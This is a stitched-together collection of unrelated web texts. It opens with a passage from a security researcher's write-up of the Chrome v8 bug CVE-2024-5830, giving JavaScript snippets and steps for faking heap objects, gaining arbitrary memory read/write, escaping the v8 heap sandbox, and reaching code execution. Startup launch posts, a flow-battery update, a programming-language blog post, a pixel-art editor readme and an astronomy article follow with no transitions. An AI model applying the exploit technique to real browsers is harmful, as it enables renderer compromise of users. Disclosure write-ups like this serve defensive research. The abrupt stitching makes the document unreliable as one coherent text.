<p>To make sure that the value I placed after the <code>NameDictionary</code> points to a fake object, I need to know the address of the fake object. As I pointed out in a <a href="https://powerofcommunity.net/poc2022/ManYueMo.pdf">talk</a> that I gave at the <a href="https://powerofcommunity.net/2022.htm">POC2022</a> conference, object addresses in v8 can be predicted reliably by simply knowing the version of Chrome. This allows me to work out the address of the fake object to use:</p>
<pre><code>
var dblArray = [1.1,2.2];
var dblArrayAddr = 0x4881d;  //&lt;---- address of dblArray is consistent across runs

var dblArrayEle = dblArrayAddr - 0x18;
//Creating a fake double array as an element with length 0x100
dblArray[0] = i32tof(dblArrMap, 0x725);
dblArray[1] = i32tof(dblArrayEle, 0x100);
</code></pre>
<p>By using the known addresses of objects and their maps, I can create both the fake object and also obtain its address.</p>
<p>Once the heap is prepared, I can trigger <code>MigrateSlowToFast</code> to access the fake object. This can be done by first making the cloned object, <code>y</code>, a prototype of another object, <code>z</code>. Accessing any property of <code>z</code> will then trigger <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/ic/ic.cc;l=441;bpv=0;bpt=0"><code>MakePrototypesFast</code></a>, which calls <code>MigrateSlowToFast</code> for the object <code>y</code>:</p>
<pre><code>
var z = {};
z.__proto__ = y;
z.p;    //&lt;------ Calls MigrateSlowToFast for y
</code></pre>
<p>This then turns <code>y</code> into a fast object, with the fake object that I prepared earlier accessible as a property of <code>y</code>. A useful fake object is a fake double array with a large <code>length</code>, which can then be used to cause an OOB access to its elements.</p>
<p>Once an OOB access to the fake double array is achieved, gaining arbitrary read and write in the v8 heap is rather straightforward. It essentially consists of the following steps:</p>
<ol>
<li>First, place an <code>Object</code> <code>Array</code> after the fake double array, and use the OOB read primitive in the fake double array to read the addresses of the objects stored in this array. This allows me to obtain the address of any V8 object.</li>
<li>Place another double array, <code>writeArr</code> after the fake double array, and use the OOB write primitive in the fake double array to overwrite the <code>element</code> field of <code>writeArr</code> to an object address. Accessing the elements of <code>writeArr</code> then allows me to read/write to arbitrary addresses.</li>
</ol>
<h2 id="thinking-outside-of-the-heap-sandbox">Thinking outside of the heap sandbox<a href="#thinking-outside-of-the-heap-sandbox" aria-label="Thinking outside of the heap sandbox"></a></h2>
<p>The recently introduced <a href="https://v8.dev/blog/sandbox">v8 heap sandbox</a> isolates the v8 heap from other process memory, such as executable code, and prevents memory corruptions within the v8 heap from accessing memory outside of the heap. To gain code execution, a way to escape the heap sandbox is needed.</p>
<p>In Chrome, <a href="https://developer.mozilla.org/en-US/docs/Web/API">Web API</a> objects, such as the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model"><code>DOM</code></a> object, are implemented in <a href="https://www.chromium.org/blink/">Blink</a>. Objects in Blink are allocated outside of the v8 heap and are represented as api objects in v8:</p>
<pre><code>
var domRect = new DOMRect(1.1,2.3,3.3,4.4);
%DebugPrint(domRect);

DebugPrint: 0x7610003484c9: [[api object] 0]
 ...
 - embedder fields: 2
 - properties: 0x7610000006f5 
 - All own properties (excluding elements): {}
 - embedder fields = {
    0, aligned pointer: 0x7718f770b880
    0, aligned pointer: 0x325d00107ca8
 }
0x7610003b6985: [Map] in OldSpace
 - map: 0x76100022f835 &lt;MetaMap (0x76100022f885 )&gt;
 - type: [api object] 0
 ...
</code></pre>
<p>These objects are essentially wrappers to objects in Blink, and they contain two <code>embedder fields</code> that store the locations of the actual Blink object, as well as their actual type. Although <code>embedder fields</code> show up as pointer values in the <code>DebugPrint</code>, because of the heap sandbox, they are not actually stored as pointers in the v8 object, but as indices to a lookup table that is protected from being modified within the v8 heap.</p>
<pre><code>
bool EmbedderDataSlot::ToAlignedPointer(Isolate* isolate,
                                        void** out_pointer) const {
  ...
#ifdef V8_ENABLE_SANDBOX
  // The raw part must always contain a valid external pointer table index.
  *out_pointer = reinterpret_cast(
      ReadExternalPointerField(
          address() + kExternalPointerOffset, isolate));
  return true;
  ...
}
</code></pre>
<p>The external look up table ensures that an <code>embedder field</code> must be a valid index in the table, and also any pointer returned from reading the <code>embedder field</code> must point to a valid Blink object. However, with arbitrary read and write in the v8 heap, I can still replace the <code>embedder field</code> of one api object by the <code>embedder field</code> of another api object that has a different type in Blink. This can then be used to cause type confusion in the Blink object.</p>
<p>In particular, I can cause a type confusion between a <a href="https://developer.mozilla.org/en-US/docs/Web/API/DOMRect"><code>DOMRect</code></a> and a <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:third_party/blink/renderer/core/typed_arrays/dom_typed_array.h;l=15"><code>DOMTypedArray</code></a>. A <code>DOMRect</code> is a simple data structure, with four properties <code>x</code>, <code>y</code>, <code>width</code>, <code>height</code> specifying its dimensions. <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:third_party/blink/renderer/core/geometry/dom_rect.h;l=36;bpv=0;bpt=0">Accessing these properties</a> simply involves writing to and reading from the corresponding offsets in the <code>DOMRect</code> Blink object. By causing a type confusion between a <code>DOMRect</code> and another other Blink object, I can read and write the values of any Blink object from these offsets. In particular, by confusing a <code>DOMRect</code> with a <code>DOMTypedArray</code>, I can overwrite its <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:third_party/blink/renderer/core/typed_arrays/array_buffer/array_buffer_contents.h;l=157"><code>backing_store_</code></a> pointer, which points to the data storage of the <code>DOMTypedArray</code>. Changing the <code>backing_store_</code> to an arbitrary pointer value and then accessing entries in the <code>DOMTypedArray</code> then gives me arbitrary read and write access to the entire memory space.</p>
<p>To defeat ASLR and identify useful addresses in the process memory, note that each api object also contains an <code>embedder field</code> that stores a pointer to the <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:third_party/blink/renderer/platform/bindings/script_wrappable.h;l=211;bpv=0;bpt=0"><code>wrapper_type_info</code></a> of the Blink object. Since these <code>wrapper_type_info</code> are global static objects, by confusing this <code>embedder field</code> with a <code>DOMRect</code> object, I can read the pointer to the <code>wrapper_type_info</code> as a property in a <code>DOMRect</code>. In particular, I can now read the address of the <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/125.0.6422.112:v8/src/common/ptr-compr.cc;l=26;bpv=0;bpt=0"><code>TrustedCage::base_</code></a>, which is the offset to a memory region that contains important objects such as JIT code addresses etc. I can now simply compile a JIT function, and modify the address of its JIT code to achieve arbitrary code execution.</p>
<p>The exploit can be found <a href="https://github.com/github/securitylab/tree/main/SecurityExploits/Chrome/v8/CVE_2024_5830">here</a> with some setup notes.</p>
<h2 id="conclusion">Conclusion<a href="#conclusion" aria-label="Conclusion"></a></h2>
<p>In this post, I’ve looked at <a href="https://github.com/advisories/GHSA-fchp-8m28-g68f">CVE-2024-5830</a>, a confusion between fast and dictionary objects caused by updating of a deprecated map. Map transition and deprecation often introduces complex and subtle problems and has also led to issues that were <a href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2020/CVE-2020-16009.html">exploited in the wild</a>. In this case, updating a deprecated map causes it to become a dictionary map unexpectedly, and in particular, the resulting dictionary map is used by code that assumes the input to be a fast map. This allows me to overwrite an internal property of the dictionary map and eventually cause an OOB access to the dictionary. I can then use this OOB access to create a fake object, leading to arbitrary read and write of the v8 heap.</p>
<p>To bypass the v8 heap sandbox, I modify API objects that are wrappers of Blink objects in v8, causing type confusions in objects outside of the heap sandbox. I then leverage this to achieve arbitrary memory read and write outside of the v8 heap sandbox, and in turn arbitrary code execution in the Chrome renderer process.</p>

We’re building AI-powered ETL for unstructured data. Trellis transforms phone calls, PDFs, and chats into structured SQL format based on any schema you define in natural language. This helps data and ops teams automate manual data entry and run SQL queries on messy data.</p><p>There’s a demo video at <a href="https://www.youtube.com/watch?v=ib3mRh2tnSo" rel="nofollow">https://www.youtube.com/watch?v=ib3mRh2tnSo</a> and a sandbox to try out (no sign-in required!) at <a href="https://demo.runtrellis.com/">https://demo.runtrellis.com/</a>.  An interesting historical archive of unstructured data we thought it would be interesting to run Trellis on top of are old Enron emails which famously took months to review. We’ve created a showcase demo here: <a href="https://demo.runtrellis.com/showcase/enron-email-analysis">https://demo.runtrellis.com/showcase/enron-email-analysis</a>, with some documentation here: <a href="https://docs.runtrellis.com/docs/example-email-analytics">https://docs.runtrellis.com/docs/example-email-analytics</a>.</p><p>Why we built this: At the Stanford AI lab where we met, we collaborated with many F500 data teams (including Amazon, Meta, and Standard Chartered), and repeatedly saw the same problem: 80% of enterprise data is unstructured, and traditional platforms can’t handle it. For example, a major commercial bank I work with couldn’t improve credit risk models because critical data was stuck in PDFs and emails.</p><p>We realized that our research from the AI lab could be turned into a solution with an abstraction layer that works as well for financial underwriting as it does for analysis of call center transcripts: an AI-powered ETL that takes in any unstructured data source and turns it into a schematically correct table.</p><p>Some interesting technical challenges we had to tackle along the way: (1) Supporting complex documents out of the box: We use LLM-based map-reduce to handle long documents and vision models for table and layout extraction. (2) Model Routing: We select the best model for each transformation to optimize cost and speed. For instance, in data extraction tasks, we could leverage simpler fine-tuned models that are specialized in returning structured JSONs of financial tables. (3) Data Validation and Schema Guarantees: We ensure accuracy with reference links and anomaly detection.</p><p>After launching Trellis, we’ve seen diverse use cases, especially in legacy industries where PDFs are treated as APIs. For example, financial services companies need to process complex documents like bonds and credit ratings into a structured format, and need to speed up underwriting and enable pass-through loan processing. Customer support and back-office operations need to accelerate onboarding by mapping documents across different schema and ERP systems, and ensure support agents follow SOPs (security questions, compliance disclosures, etc.). And many companies today want data preprocessing in ETL pipelines and data ingestion for RAG.</p><p>We’d love your feedback!

<p>My collaborator Daniel shared an update on his <a href="https://chemisting.com/2024/03/15/an-open-source-diy-flow-battery/">blog</a> about our the progress of our open-source flow battery kit, so I thought I’d do the same.

<p>For some scientists doing flow battery experiments in their respective homes/apartments, we’ve got some solid preliminary results— not bad in terms of capacity and efficiency, in the sense that we are in the right order of magnitude of real-world electrolytes here, and we’re using paper instead of an ion-exchange membrane!</p>

<p>From Daniel:</p>
<blockquote>
<p>Our design will be presented at the Flow4UBattery Event in Eindhoven, Netherlands, on April 8-9, 2024. <a href="https://www.eventbrite.com/e/flow4ubattery-event-pioneering-energy-storage-solutions-tickets-851447120257?aff=oddtdtcreator">You can register here for free</a>, which also includes complimentary lunch (so please make sure you intend to attend if you subscribe). Day 2 of the event will feature a workshop where participants can assemble a flow battery themselves using the design from our kit. Additionally, we’ll be giving away 5 complete kits during the event, each including mystat potentiostats. We’ll also have a fully assembled kit doing cycling so that you can see the fully assembled kit in action!</p>
<p>After this event, we will look into selling these kits online, with all proceeds going towards the development of higher capacity kits with the objective of reaching an open source flow battery stack within the next 2 years. We will also be publishing the full designs and bill of materials online, so that anyone can create their own too!</p>

We're building a semantic recommendation and search platform for marketplaces and content companies.</p><p>There’s a sandbox at <a href="https://play.shaped.ai/dashboard/home">https://play.shaped.ai/dashboard/home</a> that you can use to explore demo models and evaluate results interactively. And we have a demo video at <a href="https://www.youtube.com/watch?v=toCsUYQnJ_g" rel="nofollow">https://www.youtube.com/watch?v=toCsUYQnJ_g</a>.</p><p>The explosion of online content, driven by both individuals and generative tools, is making it harder than ever for users to sift through the noise and find what's relevant to them. Platforms like Netflix, TikTok, and Meta have set a high bar, proving that personalized experiences are key to cutting through the clutter and engaging users effectively.</p><p>Despite advancements in AI and semantic infrastructure like vector stores, building a truly relevant recommendation or search system is still extremely difficult. It's not just about deploying the latest LLM—the difficulties lie in creating the infrastructure to orchestrate the components seamlessly. Consider the challenge of continuously fine-tuning models with fresh data while simultaneously serving real-time personalized recommendations to millions of users. It requires a delicate balancing act of speed, scale, and sophistication.</p><p>Our goal is to empower any technical team to build state-of-the-art recommendation and search systems, regardless of their data infrastructure. Here's how we eliminate the friction:</p><p>Solving Data Challenges: We integrate directly with your data sources—Segment, Amplitude, Rudderstack, and more. We handle the complexities of real-time streaming, ETLs, and data quality robustness, so you can get started in minutes.</p><p>Leveraging Cutting-Edge Models – we utilize state-of-the-art large-scale language, image, and tabular encoding models. This not only extracts maximum value from your data but also simplifies the process, even with unstructured data.</p><p>Real-time Optimization: Unlike vision or NLP tasks, recommendation system performance hinges on real-time capabilities—training, feature engineering, and serving. We've architected our platform with this at its core.</p><p>We're already helping many companies build relevant recommendations and search for their users. Outdoorsy, for example, uses us to power its RV rental marketplace. E-commerce businesses like DribbleUp and startups like Overlap have seen up to a 40% increase in both conversions and engagement when integrating Shaped.</p><p>A bit about us: Tullie was previously an AI Researcher at FAIR working on multimodal ranking at Meta. He released PyTorchVideo, a widely-used video understanding library, which contains the video understanding models that power systems like IG Reels. Dan led product research at Afterpay and Uber, driven by how behavioral psychology influences user experience.</p><p>We've been heads down building Shaped for quite a while, so this launch feels like a big milestone. We'd love to hear your feedback – technical deep dives, feature requests, you name it.  Let us know what you think!</p></div></td></div></div>]]></description>

            <description><![CDATA[<p>URL: <a href="https://ntietz.com/blog/you-should-make-a-new-terrible-programming-language/">https://ntietz.com/blog/you-should-make-a-new-terrible-programming-language/</a>, See on <a href="https://news.ycombinator.com/item?id=41235677">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Every software engineer uses a programming language, usually multiple.
Few of us <em>make</em> programming languages.
This makes sense, because the work we need to get done can typically be done just fine in the languages that exist.
Those already have people making them better.
Let's focus on the task at hand.</p>
<p>But that means that we're missing out on some learning opportunities.
I stumbled into those when I <a href="https://ntietz.com/blog/introducing-hurl/">made a language</a> based on a silly premise: control flow via exceptions and <em>nothing else</em>.
It was done as a joke, but I accidentally learned things along the way.</p>

<p>Every serious woodworker makes some of their own equipment.
Some will make their workbench, maybe sawhorses, perhaps jigs for myriad tools and work setups.
These are things a woodworker can make from wood.
But we don't often have access to the machines we'd need for making <em>all</em> the tools we use:
You'd need a metalworking shop to make portions of chisels and planes, let alone any power tools we use.</p>
<p>As programmers, we're in a different position.
We have near total control over the machine, and we have the capability, in theory, to build everything from scratch<sup><a href="#firmware-sad">1</a></sup>.
Since the tools we use are all software-based, and we write software, we can create all of our own tools, from the operating system on up.</p>
<p>This is a privilege which few fields enjoy.
The closest other one I can think of is that machinists can likely produce a lot of their own tools, too.
Where we assume that CPUs and RAM exist, they can assume that motors and control boards exist.
Then they can build those into the rest of the tool.
And so, like machinists, we're able to get incredibly close to our tools.</p>
<h2 id="what-you-learn-by-making-a-language">What you learn by making a language</h2>
<p>One of the tools we interact with the most is the programming language.
We use one to get any programming work done, and they shape how we think through problems as well.
You use a programming language as a tool of thought even when you're away from the keyboard.
This makes it ripe for learning.
You will learn a <em>lot</em> if you make a new programming language.</p>
<p><strong>You'll learn about grammars and language design.</strong>
Before you can implement a programming language, you'll have to decide what you even want it to <em>be</em>.
Is this an imperative language, or functional, or something else?
Is it object oriented?
Does it have traditional syntax borrowed from another language, or are you doing something new and weird?
These, and many others, are the questions you'll grapple with in designing a language.</p>
<p>In the process, you'll learn about <em>why</em> other languages are designed the way they are.
If you're lucky, you'll learn some of this in the initial design process.
For example, while working on my next language, Lilac, I learned why <a href="https://ntietz.com/blog/researching-why-we-use-semicolons-as-statement-terminators/">semicolons are so common</a> because I tried picking something else.
Discussing it with a friend uncovered a <em>lot</em> of potential drawbacks in other choices!
If you're less lucky, you'll learn those lessons in the implementation phase, and those lessons will really stick.</p>
<p><strong>You'll learn about parsing.</strong>
This is one of the first things you'll run into when you start to implement your language.
You can't do a whole lot else without parsing the language.
To start writing the parser, you'll have to pick what kind of parser to write.
Don't overthink it when you're just starting out.
Although, if you're really interested in parsers, it can be a wonderful topic to dive deep into.</p>
<p><strong>You'll learn about runtime execution.</strong>
Running your code means you have to write the runtime (or the compiler) which means thinking deeply about <em>how</em> it will work at run time.
When an exception is thrown, how does that actually work?
When you reference a variable, how do you know which memory location to find it in?
If you run a recursive function, is there a limit to how far you can recurse? Why is that?
These are some of the questions you'll answer.</p>
<p>The list really goes on, and on, and on.
You can tailor your language to what you want to learn about.
My first language, Hurl, taught me about the basics of making an interpreter, designing a language, and writing a grammar.
My second language, Lilac, is going to teach me more about type systems, runtimes, and instrumentation.</p>
<p>As you go make a language, you'll gain deeper intuitions for and understanding of other languages.
When I implemented Hurl and ran into parsing errors, it would spit out raw token names at me.
This resembled some of the errors I used to see sometimes in my Neovim Rust LSP integration, and it started to make <em>those</em> errors easier to understand.
Each language and implementation decision you make will deepen your understanding of the languages you use, and you'll be a better user for it.</p>
<h2 id="it-will-be-a-bad-language-and-that-s-okay">It will be a bad language, and that's okay</h2>
<p>The nice thing with writing your own language for learning is that it's likely to be a bad one.
It's certainly <em>possible</em> to make <a href="https://gleam.run/">new, good languages</a>, and that's wonderful!
But in my experience, it's best to separate out learning how to do something from doing it exceptionally well.</p>
<p>When you go into it knowing that it's going to be a bad language, it can be very freeing!
Bad doesn't mean that it's <em>not useful to you</em>, because it still can be.
Mostly, it means that it will lack the fit and finish of a "real" language and it will be defective in some way that limits widespread use.
But you can make something that solves a specific problem for you, lets you do Advent of Code puzzles, or earns you nerd cred with your friends.
These are useful things.</p>
<p>Since you aren't going to make the next Python, you can focus on the things that are interesting, compelling, and fruitful for learning.
You can slough off all the things that are tedious but necessary for real-world usage.
Your learning can be targeted and you can keep it fun, so you're more likely to finish the project.
And it's okay to break things arbitrarily, or make wildly ridiculous language choices that just make you smile.
Because hey, it's going to be bad <em>anyway</em>, right?</p>
<h2 id="getting-started-making-languages">Getting started making languages</h2>
<p>It's intimidating to sit down in front of a blank editor and "make a new language."
For a long time, I thought—even as Principal Software Engineer—that it was some dark art that is beyond my abilities.
That's a load of crock, and <em>all of us</em> programmers can do it.
It gets easier every year to get started, because there are so many resources out there to learn from.</p>
<p>The first thing I'd recommend is implementing someone <em>else's</em> language in a guided fashion.
I followed <a href="https://craftinginterpreters.com/">Crafting Interpreters</a> for this, and it's <em>incredible</em>.
I've also heard good things about <a href="https://interpreterbook.com/">Writing An Interpreter In Go</a> and <a href="https://www.buildyourownlisp.com/">Build Your Own Lisp</a>.
Any of these will give you a taste of how languages work and let someone experienced guide you thorough it.</p>
<p>One thing, though: I've found it is a good idea to choose a <em>different</em> implementation language from what the book uses.
Crafting Interpreters uses Java and C, so I used Rust.
By choosing a different language, you're forced to grapple with the concepts to translate them.
You can't simply retype the code, so you will learn it at a deeper level.</p>
<p>After that, the direction you go is really up to you.
I got started with Hurl by just kind of designing it and throwing things at the wall to see what sticks.
That worked and let me crystallize a lot of the knowledge I got from Crafting Interpreters.
For Lilac, I've read <a href="https://www3.nd.edu/~dthain/compilerbook/">one book</a> so far and have a short list of others to read.
When I asked friends for recommendations, these are a few of the books they recommend for this:</p>
<ul>
<li><a href="https://www3.nd.edu/~dthain/compilerbook/">Introduction to Compilers and Language Design</a>, which I've read and really enjoyed</li>
<li><a href="https://shop.elsevier.com/books/engineering-a-compiler/cooper/978-0-12-815412-0">Engineering a Compiler</a></li>
<li><a href="https://www.plai.org/">Programming Languages: Application and Interpretation</a></li>
<li><a href="https://suif.stanford.edu/dragonbook/">Compilers: Principles, Techniques, and Tools</a> aka the Dragon Book</li>
</ul>
<p>What you read will depend on where you want to go next and what you want to learn.</p>
<h2 id="go-forth-make-something-fun">Go Forth, make something fun</h2>
<p>I think we should all go and make a new language.
It's a great way to learn, and new ideas have to come from somewhere.
At the end of the day, it's a wonderful way to have some fun with your computer.</p>
<p>Oh, and <em>please</em> expand the vocabulary of programming language names.
We can say "Go Forth" but it's hard to put together a whole sentence with just programming languages.
Let's fix that, shall we?
And let's B Swift about it.</p>

<p dir="auto"><em>Stipple Effect</em> is a pixel art editor that supports animation and scripting. It is designed to facilitate a variety of workflows and to encourage rapid, iterative creation of video game art assets and other types of artwork.</p>
<p dir="auto">SE was made by a solo indie game developer with the needs and skill sets of other indie devs in mind. It is lightweight and simple to learn and use, yet allows for considerable depth and complexity. SE has a feature-rich scripting API that can be harnessed for the automation of otherwise tedious and repetitive tasks.</p>

Modern measurements of how fast it is expanding disagree, however, suggesting that our understanding of the laws of physics might be off. Everyone expected the sharp vision of the James Webb Space Telescope to bring the answer into focus. But a long-awaited analysis of the telescope’s observations released late Monday evening once again gleans conflicting expansion rates from different types of data, while homing in on possible sources of error at the heart of the conflict.</p>
<p>Two rival teams have led the effort to measure the cosmic expansion rate, which is known as the Hubble constant, or H<sub>0</sub>. One of these teams, led by <a href="https://physics-astronomy.jhu.edu/directory/adam-riess/">Adam Riess</a> of Johns Hopkins University, has consistently measured H<sub>0</sub> to be about 8% higher than the theoretical prediction for how fast space should be expanding, based on the cosmos’s known ingredients and governing equations. This discrepancy, known as the Hubble tension, suggests that the theoretical model of the cosmos might be missing something — some extra ingredient or effect that speeds up cosmic expansion. Such an ingredient could be a clue to a more complete understanding of the universe.</p>
<p>Riess and his team released <a href="https://iopscience.iop.org/article/10.3847/2041-8213/ad1ddd">their latest measurement</a> of H<sub>0</sub> based on Webb data this spring, getting a value that agrees with their earlier estimates.</p>
<p>But for years a rival team led by <a href="https://astro.uchicago.edu/people/wendy-l-freedman.php">Wendy Freedman</a> of the University of Chicago has urged caution, arguing that cleaner measurements were needed. Her team’s own measurements of H<sub>0</sub> have invariably landed closer than Riess’ to the theoretical prediction, implying that the Hubble tension may not be real.</p>
<p>Since the Webb telescope started taking data in 2022, the astrophysics community has awaited Freedman’s multipronged analysis using the telescope’s observations of three types of stars. Now, the results are in: Two types of stars yield H<sub>0</sub> estimates that align with the theoretical prediction, while the third — the same type of star Riess uses — matches his team’s higher H<sub>0</sub> value.</p>
</div></div><figure><div><p><img alt="" src="https://d2r55xnwy6nx47.cloudfront.net/uploads/2024/08/Hubble_Tension-crMarkBelan-Desktop-v2.svg"></p><figcaption><div><p>Mark Belan for <em>Quanta Magazine</em></p></div></figcaption></div><figcaption><div><p>Mark Belan for <em>Quanta Magazine</em></p></div></figcaption></figure><div><h2>Introduction</h2><div><p>That the three methods disagree “is not telling us about fundamental physics,” Freedman said. “That’s telling us there’s some systematic [error] in one or more of the distance methods.”</p>
<p><a href="https://arxiv.org/abs/2408.06153">Freedman’s results</a> have been submitted to <em>The Astrophysical Journal</em> but have not yet undergone formal peer review, where outside researchers anonymously check the data and analysis. <a href="https://physics.berkeley.edu/people/faculty/saul-perlmutter">Saul Perlmutter</a>, a Nobel Prize-winning cosmologist at the University of California, Berkeley, who was shown the team’s preprint prior to its release, told <em>Quanta</em> that the results suggest “we may have a Hubble tension just within the [star-based] measurements. That’s the tension that we really have to be trying to figure out more than trying to invent new [cosmological] models.”</p>
<p>The results come after months of behind-the-scenes drama, as Freedman initially thought her analysis had killed the Hubble tension, only to see it come roaring back to life. “It’s been really … not dull, I’ll put it that way,” she said.</p>
<p>That’s business as usual. According to Perlmutter, “The Hubble constant has such a long and glorious tradition of being an impossible decades-long problem.”</p>
<h2><strong>A Clashing Universe</strong></h2>
<p>The hard part of gauging cosmic expansion is measuring distances to objects in space. The American astronomer Henrietta Leavitt first <a href="https://ui.adsabs.harvard.edu/abs/1912HarCi.173....1L/abstract">uncovered</a> a way to do this in 1912 using pulsating stars called Cepheids. These stars flicker at a rate that relates to (and can therefore reveal) their intrinsic luminosity. Once you know how luminous a Cepheid is, you can compare that to how bright or dim it appears to estimate how far away its galaxy is.</p>
<p>Edwin Hubble used Leavitt’s method to measure the distances to a handful of galaxies with Cepheids in them, discovering in 1929 that galaxies farther from us are moving away faster. That means the universe is expanding. Hubble pegged the expansion rate at 500 kilometers per second per megaparsec (km/s/Mpc), meaning that two galaxies separated by 1 Mpc, or about 3.2 million light-years, fly apart at 500 km/s.</p>
<p>That was wildly off.</p>

Still, the whole approach was limited because Cepheids are only so bright. To measure the distance to galaxies across the vastness of the universe, scientists would need a new approach.</p>
<p>In the 1970s, researchers started using Cepheids to calibrate the distances to bright supernovas, enabling more accurate measurements of H<sub>0</sub>. Then as now, two research teams led the way, using supernovas anchored to Cepheids and arriving at disagreeing values of 50 km/s/Mpc and 100 km/s/Mpc. “There was no meeting of minds ever; they were just completely polarized,” said <a href="https://people.ast.cam.ac.uk/~gpe/">George Efstathiou</a>, an astrophysicist at the University of Cambridge.</p>
<p>The 1990 launch of the Hubble Space Telescope gave astronomers a new, crisp view of the universe. Freedman led a multiyear observing campaign using Hubble, and in 2001, she and her colleagues <a href="https://iopscience.iop.org/article/10.1086/320638">announced</a> an expansion rate of 72 km/s/Mpc, estimating that this was at most 10% off.</p>

<p>Riess, who is one of the Nobel Prize-winning discoverers of dark energy, jumped into the cosmic expansion game a few years later. In 2011, his team published an H<sub>0</sub> value of 73 with an estimated 3% uncertainty.</p>
<p>Soon after this, cosmologists pioneered another method entirely. In 2013, they used the Planck telescope’s observations of light left over from the early universe to determine the detailed shape and composition of the primordial cosmos. They then plugged those ingredients into Einstein’s general theory of relativity and evolved the theoretical model forward nearly 14 billion years to predict the current state of the universe. This extrapolation <a href="https://www.aanda.org/articles/aa/full_html/2020/09/aa33910-18/aa33910-18.html">predicts</a> that the cosmos should currently be expanding at a rate of 67.4 km/s/Mpc, with an uncertainty that’s less than 1%.</p>
<p>Riess’ team’s measurement, even as its precision improved, stayed at 73. This higher value implies that galaxies today are flying apart faster than they should be according to theory. The Hubble tension was born. “If it’s a real feature of the universe, then it’s telling us that we’re missing something in the cosmological model,” Riess said.</p>
<p>This missing something would be the first new ingredient of the cosmos to be discovered since dark energy. Theorists have <a href="https://www.quantamagazine.org/why-is-the-universe-expanding-so-fast-20200427/">speculated about its identity</a>: Perhaps it is an additional form of repulsive energy that lasted for a brief time in the early universe? Or maybe it’s <a href="https://www.quantamagazine.org/the-hidden-magnetic-universe-begins-to-come-into-view-20200702/">primordial magnetic fields</a> generated during the Big Bang?</p>
<p>Or maybe the something that’s missing has more to do with us than the universe.</p>
<h2><strong>Ways of Seeing </strong></h2>
<p>Some cosmologists, including Freedman, have suspected that unrecognized errors are to blame for the discrepancy.</p>
<p>The most common argument in this vein is that Cepheid stars live in the disks of younger galaxies, in regions crowded with stars, dust and gas. “Even with the exquisite resolution of [Hubble], you don’t see a single Cepheid,” Efstathiou said, “you see it superimposed with other stars.” This congestion complicates brightness measurements.</p>
<p>When the house-size Webb telescope launched in December 2021, Riess and his colleagues turned to its powerful infrared camera to pierce the dust in the crowded regions where Cepheids live. They sought to test if crowding has as strong an effect as Freedman and other researchers have claimed.</p>

<p>Their latest results with Webb reaffirm the H<sub>0</sub> value that they <a href="https://iopscience.iop.org/article/10.3847/2041-8213/ac5c5b">measured</a> with Hubble a few years ago: 73.0, give or take 1.0 km/s/Mpc.</p>
<p>Given the crowding concern, though, Freedman had already turned to alternative stars that could serve as distance indicators. These are found in the outskirts of galaxies, far from the madding crowd.</p>
<p>One type is “tip-of-the-red-giant-branch,” or TRGB, stars. A red giant is an elderly star with a puffed-up atmosphere that glows brightly in red light. As it ages, a red giant will eventually ignite the helium in its core. At that moment, both the star’s temperature and its brightness suddenly drop off, said Kristen McQuinn, an astronomer at the Space Telescope Science Institute who led a Webb telescope project to calibrate distance measurements with TRGBs.</p>
<p>A typical galaxy has many red giants. If you plot the brightness of these stars against their temperatures, you’ll see the point at which their brightness drops off. The population of stars right before the drop is a good distance indicator, because in every galaxy, that population will have a similar spread of luminosities. By comparing the observed brightness of these stellar populations, astronomers can estimate relative distances.</p>
<p>(With any method, the physicists must deduce the absolute distance of at least one “anchor” galaxy in order to calibrate the whole scale. For their anchor, Riess, Freedman and other groups use an unusual nearby galaxy whose absolute distance has been <a href="https://arxiv.org/abs/astro-ph/9907013">determined geometrically</a> through a parallax-like effect.)</p>

<p>Using TRGBs as distance indicators is more complex than using Cepheids, however. McQuinn and her colleagues used nine of the Webb telescope’s wavelength filters to <a href="https://iopscience.iop.org/article/10.3847/1538-4357/ad306d">understand precisely</a> how their brightness depends on their color.</p>
<p>Astronomers are also beginning to turn to a new distance indicator: carbon-rich giant stars that belong to what’s called the J-region asymptotic giant branch (JAGB). These stars also sit away from a galaxy’s bright disk and emit a lot of infrared light. The technology to observe them at great distances wasn’t adequate until the Webb era, said Freedman’s graduate student Abigail Lee.</p>
<p>Freedman and her team applied for Webb telescope time to observe TRGBs and JAGBs along with the more established distance indicators, the Cepheids, in 11 galaxies. “I am a strong proponent of different methods,” she said.</p>
<h2><strong>An Evaporating Solution </strong></h2>
<p>On March 13, 2024, Freedman, Lee and the rest of their team sat around a table in Chicago to reveal what they had been hiding from themselves. Over the previous months, they had split into three groups. Each was tasked with measuring the distance to the 11 galaxies in their study using one of three methods: Cepheids, TRGBs or JAGBs. The galaxies also hosted the relevant kinds of supernovas, so their distances could calibrate the distances of supernovas in many more galaxies farther away. How fast these farther galaxies are receding from us (which is easily read off from their color) divided by their distances gives H<sub>0</sub>.</p>
<p>The three groups had calculated their distance measurements with a unique random offset added to the data. When they met in person, they removed each of the offsets and compared the results.</p>
<p>All three methods gave similar distances, within 3% uncertainty. It was “sort of jaw-dropping,” Freedman said. The team calculated three H<sub>0</sub> values, one for each distance indicator. All came within range of the theoretical prediction of 67.4.</p>
<p>At that moment, they appeared to have erased the Hubble tension. But when they dug into the analysis to write up the results, they found problems.</p>
<p>The JAGB analysis was fine, but the other two were off. The team noticed that there were large error bars on the TRGB measurement. They tried to shrink them by including more TGRBs. But when they did so, they found that the distance to the galaxies was smaller than they first thought. The change yielded a larger H<sub>0</sub> value.</p>
<p>In the Cepheid analysis, Freedman’s team uncovered an error: In about half the Cepheids, the correction for crowding had been applied twice. Fixing that significantly increased the resulting H<sub>0</sub> value. It “brought us more into agreement with Adam [Riess], which ought to make him a little happier,” Freedman said. The Hubble tension was resurrected.</p>
